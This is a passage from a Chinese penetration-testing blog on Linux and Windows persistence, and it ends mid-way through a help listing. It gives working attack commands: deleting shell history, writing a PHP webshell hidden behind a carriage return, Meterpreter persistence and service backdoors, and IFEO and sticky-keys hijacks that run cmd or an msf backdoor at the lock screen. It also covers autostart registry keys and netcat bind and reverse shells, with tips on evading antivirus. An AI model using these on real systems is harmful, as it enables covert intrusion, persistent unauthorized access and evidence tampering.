id="删除历史命令"><a href="#删除历史命令" class="headerlink" title="删除历史命令"></a>删除历史命令</h2><p>删除100行以后的操作命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sed -i &quot;100,$d&quot; .bash_history</span><br></pre></td></tr></table></figure><h2 id="r"><a href="#r" class="headerlink" title="\r"></a>\r</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo -e &quot;&lt;?=\`\$_POST[cmd]\`?&gt;\r&lt;?=&#x27;mingy&#x27;;?&gt;&quot; &gt;/var/www/html/1ndex.php</span><br></pre></td></tr></table></figure><p>通过cat查看不到\r字符前面的内容</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231338946.png" alt="image-20220823133808817"></p><p>vim编辑文件可以看到</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231338620.png" alt="image-20220823133821503"></p><p>可正常请求webshell</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231338897.png" alt="image-20220823133841715"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 权限维持 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限维持 </tag>
            
            <tag> 后门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x30 - Windows权限维持</title>
      <link href="/2022-08-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/0x30-Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
      <url>/2022-08-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/0x30-Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<h1 id="权限维持简介"><a href="#权限维持简介" class="headerlink" title="权限维持简介"></a>权限维持简介</h1><p>为了保证获取到的目标权限不会因为漏洞的修复而丢失，攻击者通常会在目标上安装一个后门，来保证对目标的持久化控制。</p><h1 id="Meterpreter权限维持"><a href="#Meterpreter权限维持" class="headerlink" title="Meterpreter权限维持"></a>Meterpreter权限维持</h1><p>meterpreter中的权限维持技术有两种类型：</p><ul><li>persistence（注册表后门）</li></ul><blockquote><p>在有杀软的环境下，一般修改注册表项会被杀软监控，杀软都会盯着这些敏感注册表项，所以修改注册表的方式，在有杀软的环境下不建议使用~动静大。</p></blockquote><ul><li>metsvc 的后门（服务后门）</li></ul><h2 id="Persistence（已弃用）"><a href="#Persistence（已弃用）" class="headerlink" title="Persistence（已弃用）"></a>Persistence（已弃用）</h2><blockquote><p>虽然弃用了，但是msf上还是有啦</p></blockquote><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Persistence 模块是先上传 vbs脚本，然后执行 vbs脚本修改注册表<code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code> 从而完成自启动。（注册表中写入的是vbs脚本路径，方便自启动vbs脚本）</p><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p>开机自启动，但是容易被杀软查杀。</p><h3 id="命令参数"><a href="#命令参数" class="headerlink" title="命令参数"></a>命令参数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run persistence -h</span><br><span class="line">-A：自动启动一个匹配的漏洞/多/处理程序来连接到代理</span><br><span class="line">-X：开机启动，注册表位置：    HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">-U：当前用户登录后自启动，注册表位置：    HKCU\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">-S：作为服务启动，注册表位置：    HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">-T：选择要使用的可执行模板</span><br><span class="line">-L：后门传到远程主机的位置默认为 %TEMP%</span><br><span class="line">-P：使用的Payload，默认windows/meterpreter/reverse_tcp，该默认的payload生成的后门为32位程序。因此，当目标机器为64位系统时，留下的后门将无法运行</span><br><span class="line">-i：设置反向连接间隔时间，单位为秒，每隔五秒重启</span><br><span class="line">-p：设置反向连接的端口号</span><br><span class="line">-r：设置反向连接的ip地址</span><br></pre></td></tr></table></figure><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run persistence -U -X -i 5 -P windows/x64/meterpreter/reverse_tcp -p 4444 -r 192.168.78.117</span><br></pre></td></tr></table></figure><blockquote><p>解释一下这条命令具体干了上面：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208240046198.png" alt="image-20220824004626002"></p><p>上图中可以看到生成了一个文件，我们在本地查看一下</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208240045868.png" alt="image-20220824004558722"></p><p>可以看到这个文件执行了两个命令，一个是清除了vbs，一个是删除了注册表项（这是在做痕迹清除的事情）</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208240051115.png" alt="image-20220824005131983"></p><p>可以看到向目标主机写入vbs脚本内容，并执行</p><p>执行后运行了一个进程，该进程会与msf通信生成一个新的session</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208240052263.png" alt="image-20220824005228117"></p><p>运行 PID为4816 修改注册表项自启动~~~</p><p>可以用SysinternalsSuite工具集中的autorun方便的查看变化~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208240107737.png" alt="image-20220824010723561" style="zoom: 33%;" /></blockquote><p>当使用 run persistence 进行持久化时默认文件上传的远程路径会推送到 %TEMP% 目录下(“C:\Users\AppData\Local\Temp&quot;)，当用户重启时， persistence 持久化就可能会出错。可以通过 -L  参数指定vbs脚本上传的位置。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run persistence -i 5 -p 4444 -r 192.168.78.117 -L C:\\Windows\\System32</span><br></pre></td></tr></table></figure><p>该命令脚本注册自启动注册表位置：HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</p><h2 id="Metsvc模块（已弃用）"><a href="#Metsvc模块（已弃用）" class="headerlink" title="Metsvc模块（已弃用）"></a>Metsvc模块（已弃用）</h2><p>metsvc  模块是开机自启动的<strong>服务型后门</strong>，msf集成的权限持久化模块，通过服务启动，服务名是 meterpreter ，监听端口是31337。（Windows系统下 服务一般是随着系统启动而启动）不好用-再试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run metsvc -h   # 模块信息</span><br><span class="line">run metsvc -A   # 启动服务（自动启动 exploit/multi/handler 连接服务）</span><br><span class="line">run metsvc -r   # 卸载服务（文件必须手动删除）</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/metsvc_bind_tcp</span><br></pre></td></tr></table></figure><blockquote><p>执行后干了什么：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208240113410.png" alt="image-20220824011334231"></p><p>上传文件 启动服务 安装服务 生成会话~~这样子一个过程</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208240115662.png" alt="image-20220824011547504"></p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211328268.png" alt="image-20220821132831052" style="zoom: 33%;" /><h2 id="exploit-x2F-windows-x2F-local-x2F-persistence"><a href="#exploit-x2F-windows-x2F-local-x2F-persistence" class="headerlink" title="exploit&#x2F;windows&#x2F;local&#x2F;persistence"></a>exploit&#x2F;windows&#x2F;local&#x2F;persistence</h2><p>在新版的msf中以上两个模块都已被弃用，功能都包含到了此模块中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/local/persistence</span><br><span class="line">set session 1</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELAY     10               yes       持久性有效载荷不断重新连接回来的延迟（秒）。</span><br><span class="line">EXE_NAME                   no        将在目标主机上使用的有效载荷的文件名（默认为%RAND%.exe）。</span><br><span class="line">PATH                       no        写入有效载荷的路径（默认为%TEMP%）。</span><br><span class="line">REG_NAME                   no        在目标主机上调用注册表值进行持久化的名称（默认为%RAND%）。</span><br><span class="line">SESSION   1                yes       运行该模块的会话</span><br><span class="line">STARTUP   USER             yes       持久性有效载荷的启动类型。(接受：USER, SYSTEM)</span><br><span class="line">VBS_NAME                   no        目标主机上的VBS持久化脚本要使用的文件名（默认为%RAND%）。</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211330638.png" alt="image-20220821133003386" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211330078.png" alt="image-20220821133018914" style="zoom:50%;" /><h2 id="Autorunscript"><a href="#Autorunscript" class="headerlink" title="Autorunscript"></a>Autorunscript</h2><p>获取shell的时候自动执行持续化脚本，可以被 Autorunscript 执行的命令目录在 metasploit&#x2F;scripts&#x2F;meterpreter 。、</p><p>一上线就立马做权限维持~~</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#persistence</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.78.117</span><br><span class="line">set LPORT 5555</span><br><span class="line">set ExitOnSession false</span><br><span class="line">set AutoRunScript persistence -r 192.168.78.117 -p 5556 -U -X -i 30</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#metsvc</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.78.117</span><br><span class="line">set LPORT 5555</span><br><span class="line">set ExitOnSession false</span><br><span class="line">set AutoRunScript metsvc -A</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h1 id="系统工具替换后门-IFEO映像劫持"><a href="#系统工具替换后门-IFEO映像劫持" class="headerlink" title="系统工具替换后门-IFEO映像劫持"></a>系统工具替换后门-IFEO映像劫持</h1><blockquote><p>以前喜欢用的方法</p><p>参考：</p><ul><li><a href="https://zhuanlan.zhihu.com/p/96504762">IFEO映像劫持在实战中的使用</a></li></ul></blockquote><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Windows  的辅助功能提供了额外的选项（屏幕键盘，放大镜，屏幕阅读等），可以帮助特殊人士更容易地使用操作系统。然而，这种功能可能会被<strong>滥用于</strong>在**&#x3D;&#x3D;启用 RDP&#x3D;&#x3D;  并&#x3D;&#x3D;获得 Administrator  权限&#x3D;&#x3D;的主机<strong>上实现持久化访问。这种技术会</strong>接触磁盘，或者需要修改注册表来执行远程存储的 payload<strong>。<br>涉及到的注册表项为 IFEO（Image File Execution Options镜像文件执行选项） ，</strong>默认是只有管理员和local system有权读写修改。** </p><blockquote><ul><li>前提：</li></ul><blockquote><ul><li>启用 RDP,获得了远程桌面</li></ul><blockquote><p>并不需要我们一直拥有远程桌面，只要他开启了远程桌面的服务，我们即使密码错误也可以到达下图中的界面，只要到达此界面，我们就可以触发劫持的后门程序~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208241921771.png" alt="image-20220824192140582" style="zoom:33%;" /></blockquote><ul><li>获得 Administrator  权限的主机</li></ul></blockquote><ul><li>注册表添加操作：</li></ul><blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add去查看命令参数</span><br><span class="line"> /v       所选项之下要添加的值名称。</span><br><span class="line"> /t       RegKey 数据类型</span><br><span class="line">           [ REG_SZ    | REG_MULTI_SZ | REG_EXPAND_SZ |</span><br><span class="line">             REG_DWORD | REG_QWORD    | REG_BINARY    | REG_NONE ]</span><br><span class="line">           如果忽略，则采用 REG_SZ。</span><br><span class="line">     /d       要分配给添加的注册表 ValueName 的数据。</span><br><span class="line"> /f       不用提示就强行覆盖现有注册表项。     </span><br></pre></td></tr></table></figure></blockquote><ul><li>涉及注册表项：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</span><br></pre></td></tr></table></figure></blockquote><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>当我们按照常理运行属于IFEO列表的文件的时候,会执行相关的选项参数，这里我们主要利用的参数是 <strong>&#x3D;&#x3D;debugger&#x3D;&#x3D;</strong> ,通过该参数我们可以实现偷梁换柱。</p><blockquote><p>注意：</p><ul><li>即&#x3D;&#x3D;可执行文件的文件名&#x3D;&#x3D;只要在上述的注册表项下，出于简化原因，IFEO使用&#x3D;&#x3D;忽略路径的方式&#x3D;&#x3D;来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名字没有变化，它就可以正常运行。</li></ul></blockquote><p>核心思路就是在唤醒这些辅助功能的时候，顺带唤醒我们的后门程序~就可以达到我们的目的。实际上就是劫持正常程序替换为我们的后门程序~~~</p><h2 id="常用辅助功能"><a href="#常用辅助功能" class="headerlink" title="常用辅助功能"></a>常用辅助功能</h2><blockquote><p>win+R 运行osk即可使用屏幕键盘，其他亦是类似</p></blockquote><ol><li>Shift（sethc）</li><li>屏幕键盘（osk）</li></ol><blockquote><p>如图所示~~在锁屏时，我们也可以通过轻松访问选项，轻易的唤醒这些程序，什么屏幕键盘啊，讲述人啊，唤醒后，我们就可以顺带的执行我们的后门程序~，是不是很nice</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208241318882.png" alt="image-20220824131837506" style="zoom: 25%;" /></blockquote><ol start="3"><li><p>辅助工具管理器（Utilman）</p></li><li><p>讲述人（Narrator）</p></li></ol><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="IE"><a href="#IE" class="headerlink" title="IE"></a>IE</h3><p>以修改IE启动程序为例，实现运行IE程序但是启动的却是cmd。</p><ol><li>找到注册表 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code>  目录下的 iexplore.exe</li><li>添加一个 debugger 字符串键值，并且赋值为 cmd.exe  的执行路径: <code>C:Windows\system32\cmd.exe</code></li><li>运行 iexplore.exe</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f      </span><br></pre></td></tr></table></figure><h3 id="Narrator"><a href="#Narrator" class="headerlink" title="Narrator"></a>Narrator</h3><p>劫持 Narrator  讲述人</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure><blockquote><p>并且要注意到：</p><ul><li><p>Narrator讲述人这种“轻松访问”里面的功能，都不需要登录，即可唤醒~~</p><p>这意味着什么呢？意味着我们即使输入了错误的密码，也可以通过点击远程桌面的外面“轻松服务”的功能，来执行我们的后门程序~</p><p>我们只需要用如上方式劫持这些服务即可~~~</p></li></ul><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208241916409.png" alt="image-20220824191658167" style="zoom: 33%;" /></blockquote><ul><li>演示：</li></ul><p>我们按照上述方式将我们的msf后门程序的位置写入注册表：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\Users\Administrator\Desktop\msf_6666_win64.exe&quot; /f</span><br></pre></td></tr></table></figure><p>在msf开启监听：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler -p windows/x64/meterpreter_reverse_tcp -H 124.223.217.243 -P 6666</span><br></pre></td></tr></table></figure><p>触发narrator.exe:</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208242010233.png" alt="image-20220824201031038" style="zoom:33%;" /><p>msf接收到会话~~</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208242043464.png" alt="image-20220824204333272"></p></blockquote><h3 id="Utilman"><a href="#Utilman" class="headerlink" title="Utilman"></a>Utilman</h3><p>劫持辅助工具管理器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure><h3 id="Notepad（较隐蔽）"><a href="#Notepad（较隐蔽）" class="headerlink" title="Notepad（较隐蔽）"></a>Notepad（较隐蔽）</h3><blockquote><p>比较隐蔽的一种，而且记事本用户用的也算比较多~~。&#x3D;&#x3D;这种劫持呢，不会影响正常程序的执行&#x3D;&#x3D;~</p></blockquote><p>实现原程序退出后静默运行后门程序。以执行 notepad  为例，退出后静默运行 calc.exe</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512</span><br><span class="line"></span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1</span><br><span class="line"></span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v MonitorProcess /t REG_SZ /d &quot;C:\Windows\system32\calc.exe&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#这后面两步，修改的注册表项是HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe的内容</span><br><span class="line">当用户退出后，用户会执行一个程序calc.exe</span><br><span class="line">SilentProcessExit表示程序退出后，会静默执行~~</span><br></pre></td></tr></table></figure><h3 id="Shift"><a href="#Shift" class="headerlink" title="Shift"></a>Shift</h3><blockquote><p>l连按五次shift，即使是锁屏，连续按五次sheift也会唤出粘滞键</p></blockquote><p>在 windows  登陆的时候按五次 shift  打开 cmd  进行操作。</p><p>前提条件:在将C盘windows目录下面的system32文件夹可写的情况下，将里面的 sethc.exe  应用程序进行转移，并生成 sethc.exe.bak  文件。并将 cmd.exe  拷贝覆盖 sethc.exe 。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir sethc.exe</span><br><span class="line">move sethc.exe sethc.exe.bak</span><br><span class="line">copy cmd.exe sethc.exe</span><br></pre></td></tr></table></figure><p>但是在 windows xp 过后，sethc组件属于完全受信用的&#x3D;&#x3D;用户 TrustInstall&#x3D;&#x3D; ，我们无法修改名字</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208250058068.png" alt="image-20220825005849922"></p><p>这时候即使 administrators 都只有名义上的只读和可执行权，我们可以&#x3D;&#x3D;手动修改其所属为 administrators&#x3D;&#x3D; ，步骤如下：（这个步骤其实如果拿不到远程桌面还是很难搞的，搞定了权限问题，才能进行替换伪造！）</p><blockquote><ol><li>右键属性&#x2F;安全&#x2F;高级</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208250105955.png" alt="image-20220825010524695" style="zoom: 33%;" /><ol start="2"><li>所有者&#x2F;编辑&#x2F;添加当前用户&#x2F;应用&#x2F;确定</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208250107050.png" alt="image-20220825010756762" style="zoom:33%;" /><ol start="3"><li><p>关闭窗口</p></li><li><p>右键属性&#x2F;安全&#x2F;编辑</p></li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208250110801.png" alt="image-20220825011030550" style="zoom:33%;" /><ol start="5"><li>选择Administrators(或者你的当前组)&#x2F;勾选完全控制&#x2F;确定</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208250111590.png" alt="image-20220825011117423" style="zoom:33%;" /><p>修改完权限之后，才能正常进行操作：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208250113623.png" alt="image-20220825011351506"></p><p>此时，按五次 shift  就可以打开 cmd了~~~~  </p></blockquote><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><blockquote><p>上述的各种劫持方式，在msf中有自动化的工具~~</p><p>Metasploit 框架提供了一个后渗透模块，可实现自动化地利用沾滞键的权限维持技术。该模块将用 CMD 替代辅助功能的二进制文件（&#x3D;&#x3D;sethc, osk, disp, utilman&#x3D;&#x3D;）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use post/windows/manage/sticky_keys</span><br><span class="line">show options</span><br><span class="line">修改target、session</span><br><span class="line">exe选项可以修改为自定义的后门程序</span><br></pre></td></tr></table></figure><p>当目标主机的屏幕被锁定时，执行 osk 屏幕键盘工具将会打开一个具有 system 级别权限的命令提示符。</p><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211339693.png" alt="image-20220821133932476" style="zoom:33%;" /></blockquote><h1 id="开机自启动注册表项"><a href="#开机自启动注册表项" class="headerlink" title="开机自启动注册表项"></a>开机自启动注册表项</h1><blockquote><ul><li>注册表的 <strong>HKEY_LOCAL_MACHINE  和 HKEY_CURRENT_USER  键的区别</strong>：前者对所有用户有效，后者只对当前用户有效</li><li>电脑启动的时候就会从注册表中启动相应的配置</li><li>msconfig命令查看启动项</li></ul></blockquote><h2 id="Run"><a href="#Run" class="headerlink" title="Run"></a>Run</h2><p>每次启动登录时都会按顺序自动执行。对这些注册表项要有一个清楚的认知~</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span><br></pre></td></tr></table></figure><h2 id="RunOnce"><a href="#RunOnce" class="headerlink" title="RunOnce"></a>RunOnce</h2><p>仅会被自动执行一次</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure><h2 id="RunServicesOnce"><a href="#RunServicesOnce" class="headerlink" title="RunServicesOnce"></a>RunServicesOnce</h2><p>程序会在系统加载时自动启动执行一次</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br></pre></td></tr></table></figure><h2 id="RunServices"><a href="#RunServices" class="headerlink" title="RunServices"></a>RunServices</h2><p>RunServices是继RunServicesOnce之后启动的程序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices</span><br></pre></td></tr></table></figure><h2 id="RunOnceEx"><a href="#RunOnceEx" class="headerlink" title="RunOnceEx"></a>RunOnceEx</h2><p><strong>Windows XP&#x2F;2003 特有的自启动注册表项</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx</span><br></pre></td></tr></table></figure><h2 id="Load"><a href="#Load" class="headerlink" title="Load"></a>Load</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</span><br></pre></td></tr></table></figure><h2 id="Winlogon"><a href="#Winlogon" class="headerlink" title="Winlogon"></a>Winlogon</h2><p>注意下面的 Notify、Userinit、Shell键值也会有自启动的程序，而且其键值可以用逗号分隔，从而实现登录的时候启动多个程序。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br></pre></td></tr></table></figure><h1 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h1><p>这里以nc为例，大家思路开放点，比如替换为生成的反弹 shell 的 payload 。</p><blockquote><p>在以下的payload中，如果有特别的显眼的字眼，可以替换为其他的字符，比如nc，这个名字可以替换为其他常见程序~</p><p>一定要注意 正向连接一定要有端口开放，不然防火墙会墙掉！！！！！</p></blockquote><h2 id="简单介绍nc语法"><a href="#简单介绍nc语法" class="headerlink" title="简单介绍nc语法"></a>简单介绍nc语法</h2><p>nc 在Linux和Windows下都可以用</p><blockquote><ul><li>NC.exe常用命令：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">connect to somewhere:   nc [-options] hostname port[s] [ports] ...</span><br><span class="line">listen for inbound:     nc -l -p port [options] [hostname] [port]</span><br><span class="line">options:</span><br><span class="line">        -g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。</span><br><span class="line">-G num          source-routing pointer: 4, 8, 12, ...</span><br><span class="line">        -l 使用监听模式，管控传入的资料。</span><br><span class="line">        -L              listen harder, re-listen on socket close </span><br><span class="line">        -n 直接使用IP地址，而不通过域名服务器。</span><br><span class="line">        -o&lt;输出文件&gt; 指定文件名称，把往来传输的流量数据以16进制字码倾倒成该文件保存。</span><br><span class="line">        -p&lt;通信端口&gt; 设置本地主机使用的通信端口。</span><br><span class="line">        -u 使用UDP传输协议。</span><br><span class="line">        -v 显示指令执行过程。更详细的信息。两次-v会有更多详细信息</span><br><span class="line">        -e 绑定某个程序，使用端口</span><br><span class="line">        -e prog         inbound program to exec [dangerous!!]</span><br><span class="line">        -d              detach from console, background mode       </span><br><span class="line">        -h              this cruft</span><br><span class="line">        -i secs         delay interval for lines sent, ports scanned          </span><br><span class="line">        -r              randomize local and remote ports</span><br><span class="line">        -s addr         local source address</span><br><span class="line">        -t              answer TELNET negotiation</span><br><span class="line">        -w secs         timeout for connects and final net reads</span><br></pre></td></tr></table></figure><ul><li>用nc正向shell</li></ul><p>原理：被控端使用nc将&#x2F;bin&#x2F;sh绑定到本地的6666端口，控制端主动连接被控端的6666端口，即可获得shell</p><blockquote><p>目标机器：</p><blockquote><p>-v:可以显示详细的信息，不过为了隐蔽性我们一般不-v<br>-d:为了隐藏我们的nc，一般是需要-d，以隐藏程序<br>-e:绑定某个程序，使用端口,我们为了反弹shell，将cmd和某个端口绑定，其他机器访问ip+端口即可访问cmd</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc.exe -Lp 5555 -d -e cmd.exe</span><br><span class="line">或者：</span><br><span class="line">nc -lvvp 6666 -e /bin/bash</span><br></pre></td></tr></table></figure><p>控制机器：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc64.exe 目标机器ip 5555</span><br><span class="line">比如：nc 10.10.1.7 6666</span><br></pre></td></tr></table></figure></blockquote><ul><li>用nc反弹shell</li></ul><p>原理： 被控端使用nc将&#x2F;bin&#x2F;sh发送到控制端的6666端口，控制端只需要监听本地的6666端口，即可获得shell。</p><blockquote><p>目标机器：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 10.10.1.11 6666</span><br></pre></td></tr></table></figure><p>控制机器：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure></blockquote></blockquote><h2 id="在-meterpreter-下"><a href="#在-meterpreter-下" class="headerlink" title="在 meterpreter 下"></a>在 meterpreter 下</h2><blockquote><p>meterpreter下已经写好了相应的reg的命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; reg</span><br><span class="line">Usage: reg [command] [options]</span><br><span class="line">Interact with the target machine&#x27;s registry.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -d   The data to store in the registry value.</span><br><span class="line">    -h   Help menu.</span><br><span class="line">    -k   The registry key path (E.g. HKLM\Software\Foo).</span><br><span class="line">    -r   The remote machine name to connect to (with current process credentials</span><br><span class="line">    -t   